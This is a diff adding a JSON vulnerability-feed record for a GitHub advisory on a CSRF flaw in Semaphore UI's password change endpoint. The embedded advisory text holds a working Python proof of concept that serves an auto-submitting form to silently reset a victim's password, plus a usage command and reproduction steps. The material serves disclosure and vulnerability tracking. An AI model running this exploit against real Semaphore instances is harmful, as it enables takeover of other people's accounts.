@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/7266727?v=4\", \"events_url\": \"https://api.github.com/users/CamilleGR/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/CamilleGR/followers\", \"following_url\": \"https://api.github.com/users/CamilleGR/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/CamilleGR/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/CamilleGR\", \"id\": 7266727, \"login\": \"CamilleGR\", \"node_id\": \"MDQ6VXNlcjcyNjY3Mjc=\", \"organizations_url\": \"https://api.github.com/users/CamilleGR/orgs\", \"received_events_url\": \"https://api.github.com/users/CamilleGR/received_events\", \"repos_url\": \"https://api.github.com/users/CamilleGR/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/CamilleGR/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/CamilleGR/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/CamilleGR\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-73292\", \"cvss\": {\"score\": 7.6, \"vector_string\": \"CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.6, \"vector_string\": \"CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-352\", \"name\": \"Cross-Site Request Forgery (CSRF)\"}, {\"cwe_id\": \"CWE-620\", \"name\": \"Unverified Password Change\"}], \"description\": \"### Summary\\n\\nThe password change form is vulnerable to CSRF, allowing an attacker to change a user password (even the administrator) by tricking a connected user to visit a malicious website. The vulnerability has been tested with version 2.18.20.\\n\\n### Details\\n\\nThe password change endpoint of Semaphore UI does not implement any CSRF protection:\\n\\n- No CSRF token required\\n- No current password confirmation required\\n- Authentication relies solely on a session cookie (`semaphore`) with no `SameSite` enforcement\\n\\nA malicious page can silently change the password of any authenticated user who visits it by submitting the /api/users/<id>/password forms. \\n\\n\\n### PoC\\n\\nTo reproduce the exploit, you can use the following python script:\\n\\n```python\\nimport logging\\nimport argparse\\nimport time\\nimport sys\\nimport os \\nfrom http.server import SimpleHTTPRequestHandler, HTTPServer\\n\\nlogging.basicConfig(filename=None, level=logging.DEBUG,format='%(asctime)s - %(message)s')\\n\\ndef forge_malicious_page(target, user_id, newpassword):\\n    return f\\\"\\\"\\\"\\n        <html>\\n        <body>\\n\\n        <form id=\\\"CSRF_POC\\\" action=\\\"{target}/api/users/{user_id}/password\\\" enctype=\\\"text/plain\\\" method=\\\"POST\\\">\\n\\n        <input type=\\\"hidden\\\" name='{{\\\"password\\\": \\\"{newpassword}\\\", \\\"project_id\\\": 1}}'  value='//}}' />\\n        </form>\\n        \\n        <script>\\n        document.getElementById(\\\"CSRF_POC\\\").submit();\\n        </script>\\n\\n        </body>\\n        </html>\\n    \\\"\\\"\\\";\\n\\n\\nparser = argparse.ArgumentParser()\\nparser.add_argument(\\\"-i\\\",\\\"--user_id\\\",type=int, help=\\\"user id to change password\\\", required=True)\\nparser.add_argument(\\\"-u\\\",\\\"--uri\\\",  help=\\\"Base uri to target\\\", required=True)\\nparser.add_argument(\\\"-n\\\",\\\"--new_password\\\",  help=\\\"new password to set\\\", default='passwordchanged')\\nparser.add_argument(\\\"-p\\\",\\\"--port\\\",  help=\\\"Port to run server\\\", default=1337)\\nargs = parser.parse_args()\\n\\n\\nclass Handler(SimpleHTTPRequestHandler):\\n    \\n     def do_GET(self):\\n        logging.info(\\\"Client: %s | Methode: %s | Chemin: %s | Query: %s\\\" %\\n                (self.client_address[0], self.command, self.path,\\n                self.path.split('?')[1] if '?' in self.path else 'None'))\\n        content=forge_malicious_page(args.uri,args.user_id, args.new_password).encode()\\n        self.send_response(200)\\n        self.send_header(\\\"Content-Type\\\", \\\"text/html; charset=utf-8\\\")\\n        self.send_header(\\\"Content-Length\\\", str(len(content)))\\n        self.end_headers()\\n        self.wfile.write(content)\\n\\n\\nhttpd = HTTPServer((\\\"\\\", args.port), Handler)\\nlogging.info(\\\"[*] Serving at port \\\"+str(args.port))\\n\\nhttpd.serve_forever()\\n```\\n\\nExample : \\n```bash\\npython poc.py -u http://semaphore:3000 -i 1 -n pwn3d -p 1337\\n```\\n\\n1 - Run the previous script with the url of the targeted semaphore instance and the id of the targeted user. The script will serve a malicious webpage on port 1337.\\n2 - Connect to semaphore UI in another tab with the targeted user. \\n3 - In the same browser, visit the malicious website (ex: localhost:1337).\\n4 - When you visit localhost:1337, the password change form will be silently submitted to semaphore, changing the targeted user password. You can now connect to the targeted user with the password `passwordchanged`.\\n\\n\\n### Impact\\n\\nThis is a Cross-Site Request Forgery vulnerability. An unauthenticated attacker can trick any user, even administrator, to change their password and take control of the semaphore instance.\", \"epss\": {\"percentage\": 0.00237, \"percentile\": 0.14504}, \"ghsa_id\": \"GHSA-8cj9-r88m-8945\", \"github_reviewed_at\": \"2026-09-03T19:23:15Z\", \"html_url\": \"https://github.com/advisories/GHSA-8cj9-r88m-8945\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8cj9-r88m-8945\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-73292\"}], \"nvd_published_at\": \"2026-08-12T16:17:22Z\", \"published_at\": \"2026-09-03T19:23:15Z\", \"references\": [\"https://github.com/semaphoreui/semaphore/security/advisories/GHSA-8cj9-r88m-8945\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-73292\", \"https://github.com/semaphoreui/semaphore/commit/2d6e2e3eb10e8bf688e2ab59609b909a012fad4c\", \"https://github.com/semaphoreui/semaphore/commit/c59c3dc9035badcbf0609c7d35679c06e590a956\", \"https://github.com/semaphoreui/semaphore/releases/tag/v2.18.21\", \"https://github.com/advisories/GHSA-8cj9-r88m-8945\"], \"repository_advisory_url\": \"https://api.github.com/repos/semaphoreui/semaphore/security-advisories/GHSA-8cj9-r88m-8945\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/semaphoreui/semaphore\", \"summary\": \"Semaphore UI: CSRF vulnerability on password change endpoint - No CSRF token or password confirmation\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-03T19:23:16Z\", \"url\": \"https://api.github.com/advisories/GHSA-8cj9-r88m-8945\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260707190631-c59c3dc9035b\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/semaphoreui/semaphore\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260707190631-c59c3dc9035b\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8cj9-r88m-8945",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/semaphoreui/semaphore: < 0.0.0-20260707190631-c59c3dc9035b"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-73292"
+    ],
+    "cvss_score": 7.6,
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/semaphoreui/semaphore"
+    ],
+    "remote": false,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-04T19:12:54.043337Z",
+  "provenance": {
+    "content_sha256": "29b5a7552a3f743db129dec48e2af0caadcf387b34f971a21717e34b05b8bc88",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-03T19:23:15Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8cj9-r88m-8945",
+  "status": "active",
+  "title": "Semaphore UI: CSRF vulnerability on password change endpoint - No CSRF token or password confirmation",
+  "updated_at": "2026-09-03T19:23:16Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8cj9-r88m-8945"
+}
